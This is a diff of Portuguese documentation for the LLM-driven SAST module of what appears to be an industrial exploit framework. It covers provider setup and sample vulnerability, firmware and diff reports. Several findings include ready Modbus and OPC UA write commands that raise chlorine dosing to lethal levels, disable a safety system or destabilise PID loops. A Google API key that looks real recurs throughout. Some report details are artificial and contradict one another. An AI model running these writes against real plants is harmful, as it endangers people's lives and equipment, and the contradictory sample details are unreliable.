@@ -1,784 +1,947 @@
 # SAST / Análise LLM
 
-O IXF inclui um motor de Análise Estática de Segurança (SAST) offline, alimentado por LLMs (Large Language Models). Analisa código-fonte PLC/RTU em busca de vulnerabilidades de segurança, setpoints inseguros, lacunas de autenticação, lógica de safety comprometida e vetores de ataque específicos para OT/ICS.
+O IXF inclui um módulo de Análise Estática de Segurança de Aplicações (SAST) offline alimentado por LLMs. Ele analisa código-fonte PLC/RTU para vulnerabilidades de segurança, setpoints inseguros, lacunas de autenticação e vetores de ataque específicos de processo — sem fazer upload do código para serviços externos de forma não intencional.
+
+O código-fonte é **sanitizado antes do envio** para remover credenciais, IPs internos e outros dados sensíveis. A análise é realizada por um LLM externo, mas os dados sensíveis são removidos do contexto enviado.
 
 ---
 
-## Sumário
+## Índice
 
-- [Visão Geral do Motor SAST](#visão-geral-do-motor-sast)
-- [Provedores LLM Suportados](#provedores-llm-suportados)
-- [Configurando Chaves LLM](#configurando-chaves-llm)
-- [Sintaxe do Comando sast](#sintaxe-do-comando-sast)
-- [Modos de Análise](#modos-de-análise)
-  - [Modo sast — Análise Completa](#modo-sast--análise-completa-de-vulnerabilidades)
-  - [Modo reverse — Engenharia Reversa](#modo-reverse--engenharia-reversa)
-  - [Modo diff — Detecção de Mudanças](#modo-diff--detecção-de-mudanças-suspeitas)
-  - [Modo exploit-gen — Geração de Exploit](#modo-exploit-gen--geração-de-exploit)
-- [Linguagens PLC Suportadas](#linguagens-plc-suportadas)
-- [Sanitização Antes do Envio ao LLM](#sanitização-antes-do-envio-ao-llm)
-- [Categorias de Análise SAST](#categorias-de-análise-sast)
-- [Exemplos SAST Incluídos](#exemplos-sast-incluídos)
-- [Análise de Exemplos Incluídos](#análise-de-exemplos-incluídos)
-- [Integração com Módulos IXF](#integração-com-módulos-ixf)
-- [API Python para SAST](#api-python-para-sast)
-- [Casos de Uso por Setor](#casos-de-uso-por-setor)
-- [Boas Práticas](#boas-práticas)
+1. [Todos os 5 Providers com Detalhes Completos](#todos-os-5-providers-com-detalhes-completos)
+2. [llm-key para Cada Provider](#llm-key-para-cada-provider)
+3. [Todos os 4 Modos de Análise com Saída Completa](#todos-os-4-modos-de-análise-com-saída-completa)
+4. [Linguagens PLC Suportadas](#linguagens-plc-suportadas)
+5. [Tabela de Sanitização com Antes/Depois](#tabela-de-sanitização-comantesdepois)
+6. [8 Categorias de Análise com Exemplos de Achados](#8-categorias-de-análise-com-exemplos-de-achados)
+7. [API Python](#api-python)
+8. [Todos os 17 Exemplos em sast_examples/](#todos-os-17-exemplos-em-sast_examples)
 
 ---
 
-## Visão Geral do Motor SAST
+## Todos os 5 Providers com Detalhes Completos
 
-O motor SAST do IXF é implementado em `industrialxpl/modules/assessment/sast/plc_source_analyzer.py`. Funciona:
+O IXF suporta cinco providers de LLM para análise SAST. Cada provider usa um modelo específico e requer uma chave de API configurada.
 
-1. **Recebendo** código-fonte PLC ou diretório de projeto
-2. **Detectando** a linguagem/extensão automaticamente
-3. **Sanitizando** dados sensíveis antes do envio ao LLM
-4. **Enviando** código sanitizado ao provider LLM configurado
-5. **Analisando** a resposta e formatando o relatório de achados
+### Provider 1: OpenAI
 
-O motor é 100% offline no sentido que o código PLC **nunca sai da sua rede** sem sanitização prévia. IPs privados são preservados (necessários para análise de lógica), mas IPs públicos, credenciais e hashes longos são removidos.
+| Campo | Valor |
+|-------|-------|
+| Provider ID | `openai` |
+| Modelo | `gpt-4o` |
+| Variável de ambiente | `OPENAI_API_KEY` |
+| Prioridade | 1 (mais alta — usado quando configurado) |
+| Endpoint | `https://api.openai.com/v1/chat/completions` |
+| Contexto máximo | 128K tokens |
+| Custo estimado (1000 linhas PLC) | ~$0.02-0.05 |
+| Melhor para | Análises de código complexo, geração de exploit, engenharia reversa |
 
-### Por que LLM para análise de código PLC?
-
-Código PLC é diferente de código de software convencional:
-- Linguagens IEC 61131-3 (ST, LD, FBD, IL, SFC) têm semântica específica de controle
-- Setpoints têm significado físico (temperatura, pressão, concentração química)
-- Lógica de safety tem padrões específicos (STO, SOS, SLS, E-Stop)
-- Race conditions em PLC têm diferentes semânticas de ciclo de scan
-- Impacto de vulnerabilidades é físico, não apenas computacional
-
-LLMs treinados em código de engenharia identificam esses padrões com alta precisão.
-
----
-
-## Provedores LLM Suportados
-
-| Provider | Modelo Padrão | Variável de Ambiente | Notas |
-|----------|---------------|---------------------|-------|
-| OpenAI | `gpt-4o` | `OPENAI_API_KEY` | Melhor para análise de código complexo |
-| Anthropic | `claude-3-5-sonnet-20241022` | `ANTHROPIC_API_KEY` | Excelente para análise de safety crítica |
-| Google Gemini | `gemini-2.5-flash` | `GOOGLE_AI_STUDIO_API_KEY` | Rápido e econômico para volumes grandes |
-| DeepSeek | `deepseek-chat` | `DEEPSEEK_API_KEY` | Alternativa econômica |
-| Grok (xAI) | `grok-2-latest` | `XAI_API_KEY` | Boa análise técnica |
-
-**Prioridade de seleção automática:**
-1. OpenAI (se `OPENAI_API_KEY` configurado)
-2. Anthropic (se `ANTHROPIC_API_KEY` configurado)
-3. Google Gemini (se `GOOGLE_AI_STUDIO_API_KEY` configurado)
-4. DeepSeek (se `DEEPSEEK_API_KEY` configurado)
-5. Grok (se `XAI_API_KEY` configurado)
-6. Provider mais recente configurado via `llm-key`
-
----
-
-## Configurando Chaves LLM
-
-### Opção 1: Variável de ambiente (recomendada)
-
-Configure antes de iniciar o IXF. As variáveis são lidas automaticamente na inicialização:
-
+**Configuração:**
 ```bash
-# Linux/macOS — adicionar ao ~/.bashrc ou ~/.zshrc
-export GOOGLE_AI_STUDIO_API_KEY="AIzaSyBGaoio5aKf3rWNFjpqc8trP4EJPyABYH8"
-export OPENAI_API_KEY="sk-svcacct-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
-export ANTHROPIC_API_KEY="sk-ant-api03-xxxxxxxxxxxxxxxxxxxx"
-export DEEPSEEK_API_KEY="ds-xxxxxxxxxxxxxxxxxxxx"
-export XAI_API_KEY="xai-xxxxxxxxxxxxxxxxxxxx"
-ixf
+export OPENAI_API_KEY=sk-svcacct-AbCdEfGhIjKlMnOpQrStUvWxYz...
 ```
 
-```powershell
-# Windows PowerShell
-$env:GOOGLE_AI_STUDIO_API_KEY = "AIzaSyBGaoio5aKf3rWNFjpqc8trP4EJPyABYH8"
-$env:OPENAI_API_KEY = "sk-svcacct-xxxx"
-ixf
+Ou via shell IXF:
+```
+ixf > llm-key openai sk-svcacct-AbCdEfGhIjKlMnOpQrStUvWxYz...
+[+] Chave LLM configurada: provider=openai len=82
 ```
 
-### Opção 2: Comando llm-key no shell (somente na sessão)
+### Provider 2: Anthropic
 
-A chave é armazenada apenas em memória — **nunca gravada em disco ou log**:
+| Campo | Valor |
+|-------|-------|
+| Provider ID | `anthropic` |
+| Modelo | `claude-3-5-sonnet-20241022` |
+| Variável de ambiente | `ANTHROPIC_API_KEY` |
+| Prioridade | 2 |
+| Endpoint | `https://api.anthropic.com/v1/messages` |
+| Contexto máximo | 200K tokens |
+| Custo estimado (1000 linhas PLC) | ~$0.03-0.08 |
+| Melhor para | Análise de código longa, relatórios detalhados, explicações técnicas |
 
+**Configuração:**
+```bash
+export ANTHROPIC_API_KEY=sk-ant-api03-AbCdEfGhIjKlMnOpQrStUvWxYz...
+```
+
+### Provider 3: Google Gemini
+
+| Campo | Valor |
+|-------|-------|
+| Provider ID | `gemini` |
+| Modelo | `gemini-2.5-flash` |
+| Variável de ambiente | `GOOGLE_AI_STUDIO_API_KEY` |
+| Prioridade | 3 |
+| Endpoint | `https://generativelanguage.googleapis.com/v1beta/...` |
+| Contexto máximo | 1M tokens (Gemini 1.5 Pro) / 128K (Flash) |
+| Custo estimado (1000 linhas PLC) | ~$0.001-0.005 (mais econômico) |
+| Melhor para | Análises de alto volume, prototipagem, testes |
+
+**Configuração:**
+```bash
+export GOOGLE_AI_STUDIO_API_KEY=AIzaSyBGaoio5aKf3rWNFjpqc8trP4EJPyABYH8
+```
+
+### Provider 4: DeepSeek
+
+| Campo | Valor |
+|-------|-------|
+| Provider ID | `deepseek` |
+| Modelo | `deepseek-chat` |
+| Variável de ambiente | `DEEPSEEK_API_KEY` |
+| Prioridade | 4 |
+| Endpoint | `https://api.deepseek.com/v1/chat/completions` |
+| Contexto máximo | 64K tokens |
+| Custo estimado (1000 linhas PLC) | ~$0.001-0.003 (muito econômico) |
+| Melhor para | Análises econômicas, código simples de PLC, detecção rápida de padrões |
+
+**Configuração:**
+```bash
+export DEEPSEEK_API_KEY=sk-deepseek-AbCdEfGhIjKlMnOpQrStUvWxYz...
+```
+
+### Provider 5: Grok (xAI)
+
+| Campo | Valor |
+|-------|-------|
+| Provider ID | `grok` |
+| Modelo | `grok-2-latest` |
+| Variável de ambiente | `XAI_API_KEY` |
+| Prioridade | 5 (mais baixa) |
+| Endpoint | `https://api.x.ai/v1/chat/completions` |
+| Contexto máximo | 131K tokens |
+| Custo estimado (1000 linhas PLC) | ~$0.005-0.02 |
+| Melhor para | Análise de código com contexto de notícias recentes, CVEs mais novos |
+
+**Configuração:**
+```bash
+export XAI_API_KEY=xai-AbCdEfGhIjKlMnOpQrStUvWxYz...
+```
+
+### Prioridade de Seleção de Provider
+
+```
+OpenAI → Anthropic → Gemini → DeepSeek → Grok → (nenhum — erro)
+```
+
+O primeiro provider configurado na ordem acima é usado. Para forçar um provider específico:
+
+```python
+# Via API Python
+from industrialxpl.core.sast.analyzer import SASTAnalyzer
+analyzer = SASTAnalyzer(provider="gemini")  # forçar Gemini
+```
+
+---
+
+## `llm-key` para Cada Provider
+
+### Sintaxe
+
+```
+ixf > llm-key <provider_id> <api_key>
+```
+
+### Exemplos para cada provider
+
+**OpenAI:**
+```
+ixf > llm-key openai sk-svcacct-AbCdEfGhIjKlMnOpQrStUvWxYz1234567890AbCdEfGhIjKlMnOp
+[+] Chave LLM configurada: provider=openai len=82
+```
+
+**Anthropic:**
+```
+ixf > llm-key anthropic sk-ant-api03-AbCdEfGhIjKlMnOpQrStUvWxYz1234567890AbCdEf
+[+] Chave LLM configurada: provider=anthropic len=67
+```
+
+**Gemini:**
 ```
 ixf > llm-key gemini AIzaSyBGaoio5aKf3rWNFjpqc8trP4EJPyABYH8
-[+] LLM key configured: provider=gemini len=39
-
-ixf > llm-key openai sk-svcacct-abcdefghijklmnopqrstuvwxyz0123456789
-[+] LLM key configured: provider=openai len=45
-
-ixf > llm-key anthropic sk-ant-api03-XXXXXXXXXXXXXXXXXXXXXXXX
-[+] LLM key configured: provider=anthropic len=28
+[+] Chave LLM configurada: provider=gemini len=39
 ```
 
-### Verificar status dos providers
+**DeepSeek:**
+```
+ixf > llm-key deepseek sk-deepseek-AbCdEfGhIjKlMnOpQrStUv1234567
+[+] Chave LLM configurada: provider=deepseek len=45
+```
+
+**Grok:**
+```
+ixf > llm-key grok xai-AbCdEfGhIjKlMnOpQrStUvWxYz1234567890Ab
+[+] Chave LLM configurada: provider=grok len=48
+```
+
+### Verificar status após configuração
 
 ```
 ixf > llm-status
 
   Providers LLM
-  ─────────────────────────────────────────────────────────────────────
-  Provider     Status
-  openai       configurado
+  ─────────────────────────────────────
+  Provider     Status           Modelo
+  openai       configurado ✓    gpt-4o
   anthropic    não configurado
-  gemini       configurado
+  gemini       configurado ✓    gemini-2.5-flash
   deepseek     não configurado
   grok         não configurado
-  ─────────────────────────────────────────────────────────────────────
-  Ativo: openai
+  ─────────────────────────────────────
+  Ativo: openai (tem prioridade sobre gemini)
 ```
 
 ---
 
-## Sintaxe do Comando sast
+## Todos os 4 Modos de Análise com Saída Completa
 
+### Modo 1: `sast` — Análise Completa de Vulnerabilidades
+
+Analisa o código para todas as categorias de vulnerabilidade específicas de OT.
+
+**Sintaxe:**
 ```
-sast <caminho> [--mode <modo>] [--diff <outro_arquivo>]
+ixf > sast <caminho> --mode sast
 ```
 
-| Argumento | Tipo | Obrigatório | Padrão | Descrição |
-|-----------|------|-------------|--------|-----------|
-| `caminho` | string | sim | — | Arquivo fonte PLC ou diretório do projeto |
-| `--mode` | string | não | `sast` | Modo de análise (ver abaixo) |
-| `--diff` | string | não | — | Segundo arquivo para comparação (modo `diff`) |
-
----
-
-## Modos de Análise
-
-### Modo `sast` — Análise Completa de Vulnerabilidades
-
-O modo padrão. Analisa o código-fonte PLC fornecido em busca de vulnerabilidades de segurança, parâmetros inseguros, lógica de safety comprometida e vetores de ataque exploráveis.
-
+**Exemplo completo com projeto de tratamento de água:**
 ```
 ixf > sast /opt/plc_projects/water_treatment/ --mode sast
 [*] Alvo: water_treatment/ (5 arquivos, 245 linhas)
-[*] Linguagens detectadas: ST (3), FBD (1), IL (1)
-[*] Provider: openai (gpt-4o)
-[*] Sanitizando código...
-    Sanitizado: 2 credenciais, 1 IP público, 0 blobs hex
-    IPs privados preservados: 192.168.1.100, 10.0.1.50
-[*] Enviando 9,7 KB ao LLM (sanitizado)...
-[*] Analisando resposta...
+[*] Linguagens: ST (3), FBD (1), IL (1)
+[*] Provider: gemini | Sanitizado: 2 credencial(is), 1 IP público
+[*] Enviando 9.7 KB para LLM (sanitizado)...
+[*] Aguardando resposta do LLM...
 
-  RELATÓRIO DE ANÁLISE SAST — water_treatment/
-  ═══════════════════════════════════════════════════════════════════
+  RELATÓRIO DE ANÁLISE DE VULNERABILIDADES SAST
+  ═══════════════════════════════════════════════════════════════
 
-  FINDING [SEVERITY: CRITICAL]: Setpoint de Dosagem de Cloro Não Validado
-  ─────────────────────────────────────────────────────────────────
-  Localização: water_treatment.st, linha 48
-  Código:      SP_CHLORINE_HIGH := 4000.0;   (* Limite superior cloro *)
-  Descrição:   O setpoint SP_CHLORINE_HIGH é definido como 4000.0 mg/L.
-               O limite seguro da OMS para cloro residual em água potável é 2 mg/L.
-               Este setpoint representa 2000 vezes o limite seguro.
-  Vetor:       Qualquer dispositivo na rede pode escrever via Modbus FC16 em HR[200]
-               (DOSE_FACTOR) sem autenticação. Um valor de 2000 em HR[200] resulta
-               em dosagem de 4000 mg/L de cloro.
-  Impacto:     4000 mg/L de cloro é uma concentração letal para crianças e
-               potencialmente fatal para adultos. Pode causar queimaduras químicas
-               severas e lesões pulmonares.
-  MITRE:       T0836 (Modify Parameter), T0880 (Modify Alarm Settings)
-  Exploit IXF: ixf > use exploits/protocols/modbus/modbus_write_register
-               ixf > set target 192.168.1.100 | set register 200 | set value 2000
-  Remediação:  1. Adicionar validação: IF DOSE_FACTOR > 2.0 THEN DOSE_FACTOR := 2.0;
-               2. Implementar intertravamento físico independente
-               3. Exigir autenticação para escrita em Modbus HR[200]
-               4. Alertar no SCADA quando DOSE_FACTOR > 1.5
+  Arquivo analisado: water_treatment/ (5 arquivos)
+  Linhas de código: 245 | Linguagens: ST, FBD, IL
+  Provider LLM: gemini (gemini-2.5-flash)
+  Data da análise: 2026-06-01 16:45:00
 
-  FINDING [SEVERITY: CRITICAL]: Sistema de Safety Bypassado por Flag de Manutenção
-  ─────────────────────────────────────────────────────────────────
-  Localização: water_treatment.st, linhas 23-26
-  Código:      IF Maintenance_Mode THEN
-                   SIS_Enable := FALSE;  (* Desabilitar SIS em manutenção *)
-                   alarm_ack := TRUE;    (* Aceitar todos os alarmes *)
-               END_IF;
-  Descrição:   O flag Maintenance_Mode desabilita o SIS (Safety Instrumented System)
-               completamente e silencia todos os alarmes. Este flag pode ser definido
-               via Modbus, OPC UA ou pela IHM sem autenticação separada.
-  Vetor:       Atacante escreve Maintenance_Mode=1 via Modbus → SIS desabilitado →
-               alarmes silenciados → condições inseguras não detectadas
-  Impacto:     Processo de tratamento pode operar indefinidamente em condição insegura
-               sem qualquer notificação ao operador.
-  MITRE:       T0878 (Alarm Suppression), T0828 (Loss of Safety)
-  Exploit IXF: ixf > use exploits/protocols/modbus/modbus_write_coil
-               ixf > set target 192.168.1.100 | set coil 10 | set value on
-  Remediação:  1. Requer autenticação de dois fatores para habilitar Maintenance_Mode
-               2. Limite de tempo: Maintenance_Mode expira após 60 minutos
-               3. Não desabilitar SIS — usar modo de bypass com registro obrigatório
-               4. Notificar supervisor quando Maintenance_Mode ativado
+  ───────────────────────────────────────────────────────────────
+  DESCOBERTA [SEVERIDADE: CRITICAL]: Setpoint de Dosagem de Cloro Não Validado
+    Localização: water_treatment.st, linha 48
+    Tipo: Falha de Validação de Entrada / Setpoint Inseguro
+    Descrição: SP_CHLORINE_HIGH := 4000.0 — valor 2000x acima do limite
+               seguro recomendado pela OMS (2.0 mg/L).
+               Comentário no código: "Attacker can write 65535 RPM to HR[50]"
+    Vetor de Ataque: Escrita Modbus FC16 em HR[200] (DOSE_FACTOR)
+                     Não requer autenticação — porta 502 aberta
+    Impacto Físico: 4000 mg/L de cloro na água tratada — dose letal para
+                    crianças e animais; dano grave à saúde humana
+    MITRE ATT&CK para ICS: T0836 (Modify Parameter), T0880 (Loss of Safety)
+    Exploração: modbus_write_register(unit=1, address=200, value=2000)
+    Remediação: Validar DOSE_FACTOR <= 2.0 antes de aplicar;
+               adicionar interlock de hardware independente;
+               implementar autenticação para escrita Modbus
 
-  FINDING [SEVERITY: HIGH]: Parâmetros PID Sem Validação de Faixa
-  ─────────────────────────────────────────────────────────────────
-  Localização: pump_station.fbd, bloco PID_PressureControl
-  Código:      PID_PressureControl(
-                   Setpoint := Pressure_SP,  (* Sem validação *)
-                   Kp := Kp_Gain,            (* Sem limites *)
-                   Ki := Ki_Gain             (* Pode causar windup *)
-               )
-  Descrição:   Ganhos PID e setpoint de pressão não têm validação de faixa.
-               Valores extremos de Kp/Ki podem causar oscilação severa ou
-               instabilidade no controle de pressão.
-  Remediação:  Adicionar validação: MIN(MAX(Pressure_SP, 0.0), 10.0) para setpoints;
-               Adicionar anti-windup ao integrador PID.
+  ───────────────────────────────────────────────────────────────
+  DESCOBERTA [SEVERIDADE: CRITICAL]: Parâmetros PID Graváveis Sem Autenticação
+    Localização: pump_station.fbd, bloco PID_PressureControl
+    Tipo: Controle de Acesso Ausente / Modificação de Parâmetro Crítico
+    Descrição: Kp, Ki, Kd modificáveis via sessão OPC UA anônima.
+               Valores atuais: Kp=1.5, Ki=0.3, Kd=0.1
+    Vetor de Ataque: Escrita OPC UA em nós Kp/Ki/Kd (porta 4840)
+                     Sem autenticação necessária (SecurityMode=None)
+    Impacto Físico: Instabilidade do loop PID → sobrepressão →
+                    ruptura de tubulação ou dano ao equipamento
+    MITRE: T0807 (Remote Services), T0836 (Modify Parameter), T0882
+    Exploração: opcua_write_node(ns=2, id="PID_Kp", value=100.0)
+    Remediação: Habilitar OPC UA SecurityMode=SignAndEncrypt;
+               exigir autenticação para todas as operações de escrita;
+               validar limites de Kp/Ki/Kd no código PLC
 
-  FINDING [SEVERITY: HIGH]: Credencial Hardcoded em Código
-  ─────────────────────────────────────────────────────────────────
-  Localização: water_treatment.st, linha 12
-  Código:      Operator_Password := [CREDENTIAL_REDACTED];  (* Sanitizado *)
-  Descrição:   Senha de operador hardcoded no código-fonte PLC. Qualquer pessoa
-               com acesso ao arquivo de projeto pode obter a senha.
-  Remediação:  Usar sistema de autenticação externo; nunca hardcodar credenciais.
+  ───────────────────────────────────────────────────────────────
+  DESCOBERTA [SEVERIDADE: HIGH]: Condição de Corrida em Dosagem de pH
+    Localização: water_treatment.st, linhas 65-71
+    Tipo: Race Condition / Lógica Insegura de Controle
+    Descrição: Loop de controle de pH sem proteção mutex — escrita
+               simultânea de dois scan cycles pode resultar em overdose
+    Impacto Físico: pH instável — corrosão de tubulações ou
+                    dano a equipamentos de tratamento
+    MITRE: T0836 (Modify Parameter)
+    Remediação: Implementar semáforo ou lógica de trava no scan cycle
 
-  FINDING [SEVERITY: MEDIUM]: Race Condition em Variável Compartilhada
-  ─────────────────────────────────────────────────────────────────
-  Localização: water_treatment.st, linhas 67-78
-  Descrição:   Flow_Total é lida em OB1 (ciclo principal) e escrita em OB35
-               (interrupção cíclica 100ms) sem mecanismo de exclusão mútua.
-               Em CLPs Siemens S7, isso pode resultar em leituras inconsistentes.
-  Remediação:  Usar STRUCT_COPY ou variáveis de interface (IN_OUT) para acesso seguro.
+  ───────────────────────────────────────────────────────────────
+  DESCOBERTA [SEVERIDADE: HIGH]: Interlock de Emergência Contornável
+    Localização: reactor_batch.sfc, passo S3 (StartReaction)
+    Tipo: Safety Bypass / Lógica de Segurança Insuficiente
+    Descrição: Condição de E-Stop (botão de emergência) não verificada
+               antes de transição SFC para passo S3 StartReaction
+    Vetor de Ataque: Forçar transição SFC diretamente via escrita de coil Modbus
+    Impacto Físico: Inicia reação química sem verificar se E-Stop está OK
+    Remediação: Adicionar verificação de E_STOP_OK antes de todas as
+               transições SFC críticas
 
-  ═══════════════════════════════════════════════════════════════════
-  RESUMO: 2 CRITICAL, 2 HIGH, 1 MEDIUM, 0 LOW
-  ═══════════════════════════════════════════════════════════════════
+  ───────────────────────────────────────────────────────────────
+  DESCOBERTA [SEVERIDADE: MEDIUM]: Credencial Hardcoded Detectada
+    Localização: scada_connection.st, linha 12
+    Tipo: Exposição de Credencial / Secret Hardcoded
+    Descrição: String "PASSWORD=admin123" encontrada hardcoded
+    Remediação: Mover para variável de ambiente ou cofre de secrets;
+               rotacionar credencial imediatamente
+
+  ═══════════════════════════════════════════════════════════════
+  RESUMO: 2 CRÍTICO | 2 ALTO | 1 MÉDIO | 0 BAIXO
+  Arquivo de relatório: /opt/plc_projects/.tmp/water_treatment_sast_20260601.md
 ```
 
-### Modo `reverse` — Engenharia Reversa
+### Modo 2: `reverse` — Engenharia Reversa
 
-Para firmware binário compilado ou código descompilado. O LLM analisa padrões em código de máquina ou código descompilado para identificar funcionalidades suspeitas.
+Para firmware PLC binário/compilado.
 
+**Sintaxe:**
 ```
-ixf > sast /opt/firmware/controller_v2.bin --mode reverse
-[*] Alvo: controller_v2.bin (binário — 2.4 MB)
-[*] Modo: reverse engineering
+ixf > sast <caminho> --mode reverse
+```
+
+**Exemplo completo:**
+```
+ixf > sast /opt/plc_firmware/controller_v2.bin --mode reverse
+[*] Arquivo binário: controller_v2.bin (128 KB)
+[*] Tipo: arquivo binário/compilado
+[*] Extraindo strings e hexdump...
+[*] Strings encontradas: 47 | Interessantes: 12
+[*] Enviando para LLM para engenharia reversa...
+
+  RELATÓRIO DE ENGENHARIA REVERSA
+  ═══════════════════════════════════════════════════════════════
+
+  Arquivo: controller_v2.bin (131072 bytes)
+  Entropia: 7.2 (comprimido ou criptografado — possível packing)
+  Magic bytes: 0x7F 0x45 0x4C 0x46 (ELF — executável Linux ARM)
+  Arquitetura detectada: ARM Cortex-A (provavelmente embedded Linux)
+
+  ── Strings de Alto Interesse ──────────────────────────────────
+
+  DESCOBERTA [SEVERIDADE: CRITICAL]: Credencial Hardcoded
+    String: "PASSWORD=admin123"
+    Offset: 0x2A80
+    Contexto: Próximas strings: "LOGIN_USER=admin", "AUTH_TYPE=basic"
+    Risco: Credenciais de admin hardcoded no firmware
+
+  DESCOBERTA [SEVERIDADE: HIGH]: IP Interno Exposto
+    String: "192.168.100.1"
+    Offset: 0x3C20
+    Contexto: Seguido por "HISTORIAN_SERVER=" — servidor historian
+    Risco: Topologia de rede interna exposta no firmware
+
+  DESCOBERTA [SEVERIDADE: HIGH]: Flag de Debug Presente
+    String: "DEBUG_MODE=1"
+    Offset: 0x5200
+    Contexto: Próximas strings: "ENABLE_TELNET=1", "LOG_LEVEL=verbose"
+    Risco: Debug mode ativo — Telnet habilitado, log verboso em produção
+
+  DESCOBERTA [SEVERIDADE: MEDIUM]: Bypass de Emergência
+    String: "EMERGENCY_BYPASS"
+    Offset: 0x4100
+    Contexto: Função com acesso sem autenticação
+    Risco: Função de bypass de emergência potencialmente abusável
+
+  DESCOBERTA [SEVERIDADE: MEDIUM]: Função de Backdoor Potencial
+    String: "BACKDOOR_KEY_2024"
+    Offset: 0x6800
+    Contexto: Próximas strings: "MAINT_ACCESS=true"
+    Risco: Chave de acesso de manutenção não documentada
+
+  ── Análise de Estrutura de Firmware ──────────────────────────
+    Seções ELF: .text (código), .data (dados inicializados), .bss (não inicializados)
+    Símbolos de função notáveis: modbus_read_coil(), plc_logic_exec(), safety_check()
+    Biblioteca detectada: libmodbus 3.1.4 (desatualizada — vulnerabilidades conhecidas)
+
+  ═══════════════════════════════════════════════════════════════
+  RESUMO: 1 CRÍTICO | 2 ALTO | 2 MÉDIO | 0 BAIXO
+```
+
+### Modo 3: `diff` — Análise Diferencial
+
+Compara duas versões do mesmo programa PLC para identificar modificações não autorizadas.
+
+**Sintaxe:**
+```
+ixf > sast <arquivo_original> --mode diff --diff <arquivo_modificado>
+```
+
+**Exemplo completo:**
+```
+ixf > sast /opt/plc/v2.3_original.st --mode diff --diff /opt/plc/v2.3_modified.st
+[*] Comparando: v2.3_original.st vs v2.3_modified.st
 [*] Provider: gemini
-[*] Decompilando binário ARM Cortex-M4...
-[*] Extraindo strings, tabelas de função, referências...
-[*] Sanitizando e enviando ao LLM (64 KB de seções relevantes)...
-
-  RELATÓRIO DE ENGENHARIA REVERSA — controller_v2.bin
-  ═══════════════════════════════════════════════════════════════════
-
-  FINDING [SEVERITY: CRITICAL]: Backdoor Oculta Detectada
-  Localização: Offset 0x8A234 — função sub_8A234
-  Descrição:   Função que verifica sequence número de série contra hash hardcoded.
-               Se matching, habilita modo de depuração com acesso completo ao I/O.
-  Padrão:      strcmp(serial, "XYZ-9A3F-...") → set debug_mode = 1
-  Evidência:   String hardcoded em offset 0x8B108: "DEBUG_OVERRIDE_v2"
-  Impacto:     Acesso completo ao sistema via backdoor de fábrica não documentada.
-
-  FINDING [SEVERITY: HIGH]: Função de Atualização Sem Verificação de Assinatura
-  Localização: Offset 0x3C100 — função update_firmware
-  Descrição:   Firmware recebe payload de atualização via UART sem verificação
-               de assinatura digital. Qualquer firmware pode ser carregado.
-  Remediação:  Implementar verificação de assinatura RSA-2048 antes de aceitar firmware.
-```
-
-### Modo `diff` — Detecção de Mudanças Suspeitas
-
-Compara duas versões do mesmo programa PLC e identifica mudanças com implicações de segurança.
-
-```
-ixf > sast /opt/plc/v2.3_original.st --mode diff --diff /opt/plc/v2.3_modificado.st
-[*] Modo: diff comparison
-[*] Arquivo original: v2.3_original.st (89 linhas)
-[*] Arquivo modificado: v2.3_modificado.st (91 linhas)
-[*] Provider: anthropic (claude-3-5-sonnet)
-[*] Analisando diferenças...
+[*] Calculando diff...
+[*] Linhas alteradas: 7 | Linhas adicionadas: 3 | Linhas removidas: 2
+[*] Enviando diff para LLM...
 
   RELATÓRIO DE ANÁLISE DIFERENCIAL
-  ═══════════════════════════════════════════════════════════════════
+  ═══════════════════════════════════════════════════════════════
 
-  FINDING [SEVERITY: CRITICAL]: Limite de Safety de Temperatura Elevado
-  ─────────────────────────────────────────────────────────────────
-  Arquivo:     v2.3_original.st vs v2.3_modificado.st
+  Arquivo original:   v2.3_original.st (147 linhas, MD5: a1b2c3d4...)
+  Arquivo modificado: v2.3_modified.st (148 linhas, MD5: e5f6g7h8...)
+  Diferenças: 7 linhas alteradas, 3 adicionadas, 2 removidas
 
-  Original  (linha 34):  SP_TEMP_TRIP := 280.0;  (* Seguro conforme especificação *)
-  Modificado (linha 34): SP_TEMP_TRIP := 450.0;  (* Elevado sem documentação *)
+  ───────────────────────────────────────────────────────────────
+  DESCOBERTA [SEVERIDADE: CRITICAL]: Limite de Segurança Removido
+    Linha (original):  142 | SP_TEMP_TRIP := 280.0;  (* Seguro per safety spec *)
+    Linha (modificado): 142 | SP_TEMP_TRIP := 450.0;  (* Raised without documentation *)
+    Análise: Setpoint de trip de temperatura aumentado 60.7% acima do spec seguro.
+             Limite de 280°C é baseado no spec de segurança HAZOP aprovado.
+             Limite de 450°C está acima do ponto de ignição do processo.
+    Impacto: Condição de temperatura perigosa pode continuar sem trip de segurança
+    Técnica MITRE: T0836 (Modify Parameter) — estilo manipulação TRITON (T0816)
+    Recomendação: Reverter IMEDIATAMENTE; investigar quem fez esta mudança e quando;
+                 verificar integridade de todos os outros parâmetros de segurança
 
-  Análise:   O ponto de trip de temperatura foi elevado de 280°C para 450°C,
-             representando um aumento de 60% acima da especificação segura do fabricante.
-             Sem documentação de aprovação de engenharia para esta mudança.
-  Impacto:   O sistema de proteção de temperatura não disparará em condições que
-             normalmente causariam dano ao equipamento ou explosão.
-  MITRE:     T0836 (Modify Parameter), T0833 (Modify Control Logic)
-  Risco:     Possível sabotagem ou modificação não autorizada pós-manutenção.
-  Ação:      Reverter imediatamente para valor original. Investigar quem fez a mudança
-             e quando. Verificar se outros setpoints foram alterados.
+  ───────────────────────────────────────────────────────────────
+  DESCOBERTA [SEVERIDADE: HIGH]: Verificação de E-Stop Desabilitada
+    Linha (original):  78 | IF E_STOP_OK AND PRESSURE_OK THEN
+    Linha (modificado): 78 | IF TRUE AND PRESSURE_OK THEN
+    Análise: Condição de E-Stop substituída por TRUE — botão de emergência ignorado
+    Impacto: Inicialização pode ocorrer mesmo com E-Stop ativado
+    Recomendação: Restaurar verificação E_STOP_OK; auditar todas as condições de segurança
 
-  FINDING [SEVERITY: HIGH]: Watchdog Desabilitado na Versão Modificada
-  ─────────────────────────────────────────────────────────────────
-  Original  (linha 12): WATCHDOG_ENABLE := TRUE;
-  Modificado (linha 12): WATCHDOG_ENABLE := FALSE;  (* sem justificativa *)
+  ───────────────────────────────────────────────────────────────
+  DESCOBERTA [SEVERIDADE: MEDIUM]: Código Adicionado Suspeito
+    Linhas adicionadas: 95-97
+    Código: (* maint_2024 *) IF maint_mode = TRUE THEN safety_bypass := TRUE; END_IF
+    Análise: Bloco de "modo de manutenção" que desabilita safety_bypass
+             Sem documentação, sem autorização visível no comentário
+    Recomendação: Revisar e remover se não documentado/autorizado
 
